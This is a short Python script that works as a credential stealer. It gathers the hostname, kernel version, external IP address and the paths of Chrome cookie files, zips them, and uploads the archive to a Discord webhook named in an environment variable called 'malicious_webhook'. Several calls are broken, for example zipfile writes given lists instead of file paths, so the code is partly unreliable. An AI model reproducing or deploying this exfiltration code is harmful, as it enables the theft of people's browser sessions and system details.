import os
import discord
import zipfile

from github3 import login

def get_sysinfo():
    uname = os.uname()
    return uname[1] + ' ' + uname[2]

def get_ext_ip():
   return [ip for ip in os.popen('dig +short myip.opendns.com @resolver1.opendns.com')]
   
def get_chrome_cookies():
   return [cookie for cookie in os.popen('find ~/.config/google-chrome -name "Cookies"')]

zf = zipfile.ZipFile('sysinfo.zip', mode='w')
try:
    print('adding {filename}'.format(filename=get_sysinfo()))
    zf.write(get_sysinfo())
    print('adding {filename}'.format(filename=get_ext_ip()))
    zf.write(get_ext_ip())
    print('adding {filename}'.format(filename=get_chrome_cookies()))
    zf.write(get_chrome_cookies())
finally:
    zf.close()

discord_webhook = os.environ.get('malicious_webhook')

hook = discord.Webhook(url=discord_webhook)
hook.send(file=open('sysinfo.zip', 'rb'))
